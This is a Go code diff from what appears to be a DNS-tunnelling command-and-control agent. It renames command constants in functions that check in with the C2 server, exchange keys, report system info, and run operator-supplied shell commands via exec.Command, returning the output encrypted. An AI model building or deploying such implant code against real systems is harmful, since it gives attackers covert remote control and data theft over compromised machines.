@@ -108,20 +108,20 @@ func (a *Agent) CheckIn() {
 		}
 	}
 
-	if !a.IsCommandInSendQ(AgentCommand_AGENT_CHECKIN) && !a.IsCommandInSendQ(AgentCommand_AGENT_KEYX) {
+	if !a.IsCommandInSendQ(AgentCommand_AGENT_COMMAND_CHECKIN) && !a.IsCommandInSendQ(AgentCommand_AGENT_COMMAND_KEYX) {
 		// if we don't have a computed secret yet, we will send dummy data with our checkin
 		// this will be our first ping if the c2 doesn't know about us yet.
 		// c2 may error out trying to decrypt the dummy payload if an agent is already checked in
 		// the operator may choose to delete the agent and allow first ping again
 		if a.crypto.secret == nil {
 			log.Printf("checking in with dummy data (no secret computed yet)\n")
-			a.CleanupSendQ(AgentCommand_AGENT_CHECKIN)
-			a.QueueData(AgentCommand_AGENT_CHECKIN, []byte{0xff})
+			a.CleanupSendQ(AgentCommand_AGENT_COMMAND_CHECKIN)
+			a.QueueData(AgentCommand_AGENT_COMMAND_CHECKIN, []byte{0xff})
 			return
 		}
 
 		log.Printf("checking in with encrypted data\n")
-		a.SendEncrypted(a.crypto.RandomBytes(6), AgentCommand_AGENT_CHECKIN)
+		a.SendEncrypted(a.crypto.RandomBytes(6), AgentCommand_AGENT_COMMAND_CHECKIN)
 	}
 }
 
@@ -133,11 +133,11 @@ func (a *Agent) SendEncrypted(message []byte, command AgentCommand) {
 	}
 
 	var data []byte
-	if command == AgentCommand_AGENT_KEYX {
+	if command == AgentCommand_AGENT_COMMAND_KEYX {
 		data = message
 	} else {
 		commandResponse := &Command_Response{}
-		commandResponse.Command = AgentCommand_AGENT_KEYX
+		commandResponse.Command = AgentCommand_AGENT_COMMAND_KEYX
 		commandResponse.Data = message
 		commandResponse.Status = AgentCommandStatus_COMMAND_STATUS_SUCCESS
 		commandResponseProto, marshalError := proto.Marshal(commandResponse)
@@ -164,8 +164,8 @@ func (a *Agent) Keyx() {
 		a.NewKeys()
 	}
 
-	a.CleanupSendQ(AgentCommand_AGENT_KEYX)
-	a.QueueData(AgentCommand_AGENT_KEYX, a.crypto.pubkey)
+	a.CleanupSendQ(AgentCommand_AGENT_COMMAND_KEYX)
+	a.QueueData(AgentCommand_AGENT_COMMAND_KEYX, a.crypto.pubkey)
 }
 
 // QueueData queues up the data string as DNS queries to be
@@ -319,7 +319,7 @@ func (a *Agent) ProcessResponse(response []string) {
 				return
 			}
 
-			if AgentCommand(command) == AgentCommand_AGENT_IGNORE {
+			if AgentCommand(command) == AgentCommand_AGENT_COMMAND_IGNORE {
 				responseStatus, err := HexBytesToInt(blocks[len(blocks)-1])
 				if err != nil {
 					log.Printf("error decoding status from c2 response: %q, (err: %q)\n", response[i], err)
@@ -411,7 +411,7 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, dataId string, paddedBytesCou
 	delete(a.recvq, dataId)
 
 	// keyx commands are not encrypted
-	if command == AgentCommand_AGENT_KEYX {
+	if command == AgentCommand_AGENT_COMMAND_KEYX {
 		commandRequest, unmarshalError := unmarshalCommandRequest(data)
 		if unmarshalError != nil {
 			log.Printf("failed unmarshal command request: %x (err: %q)\n", data, unmarshalError)
@@ -441,7 +441,7 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, dataId string, paddedBytesCou
 	decryptedData = commandRequest.Data
 
 	switch command {
-	case AgentCommand_AGENT_SYSINFO:
+	case AgentCommand_AGENT_COMMAND_SYSINFO:
 		var sysinfoData = a.GetSysInfo()
 		log.Printf("sysinfo: %+v\n", sysinfoData)
 		sysinfoProto, marshalError := proto.Marshal(sysinfoData)
@@ -449,23 +449,23 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, dataId string, paddedBytesCou
 			log.Printf("failed marshal command response: %x (err: %q)\n", sysinfoData, marshalError)
 			return
 		}
-		a.SendEncrypted([]byte(sysinfoProto), AgentCommand_AGENT_SYSINFO)
+		a.SendEncrypted([]byte(sysinfoProto), AgentCommand_AGENT_COMMAND_SYSINFO)
 		break
-	case AgentCommand_AGENT_EXECUTE:
+	case AgentCommand_AGENT_COMMAND_EXECUTE:
 		executeCommand := string(decryptedData)
 		commandArguments := strings.Fields(executeCommand)
 		go func() {
 			out, err := exec.Command(commandArguments[0], commandArguments[1:]...).Output()
 			if err != nil {
 				log.Printf("error executing: %s (err: %s)\n", executeCommand, err)
-				a.SendEncrypted([]byte(err.Error()), AgentCommand_AGENT_MESSAGE)
+				a.SendEncrypted([]byte(err.Error()), AgentCommand_AGENT_COMMAND_MESSAGE)
 				return
 			}
 			log.Printf("executed command: %s output: %s\n", executeCommand, out)
-			a.SendEncrypted(out, AgentCommand_AGENT_MESSAGE)
+			a.SendEncrypted(out, AgentCommand_AGENT_COMMAND_MESSAGE)
 		}()
 		break
-	case AgentCommand_AGENT_SET_CONFIG:
+	case AgentCommand_AGENT_COMMAND_SET_CONFIG:
 		newConfig, unmarshalError := unmarshalAgentConfig(decryptedData)
 		if unmarshalError != nil {
 			log.Printf("failed unmarshal set config proto: %x (err: %q)\n", decryptedData, unmarshalError)
@@ -492,13 +492,13 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, dataId string, paddedBytesCou
 		log.Printf("updated agent config: %+v\n", a.config)
 
 		break
-	case AgentCommand_AGENT_MESSAGE:
+	case AgentCommand_AGENT_COMMAND_MESSAGE:
 		log.Printf("msg> %s\n", decryptedData)
-		a.SendEncrypted([]byte("pong!"), AgentCommand_AGENT_MESSAGE)
+		a.SendEncrypted([]byte("pong!"), AgentCommand_AGENT_COMMAND_MESSAGE)
 		break
-	case AgentCommand_AGENT_SHUTDOWN:
+	case AgentCommand_AGENT_COMMAND_SHUTDOWN:
 		log.Printf("shutting down...\n")
-		a.SendEncrypted([]byte("shutting down..."), AgentCommand_AGENT_MESSAGE)
+		a.SendEncrypted([]byte("shutting down..."), AgentCommand_AGENT_COMMAND_MESSAGE)
 		a.ProcessSendQ()
 		a.shutdown = true
 		break
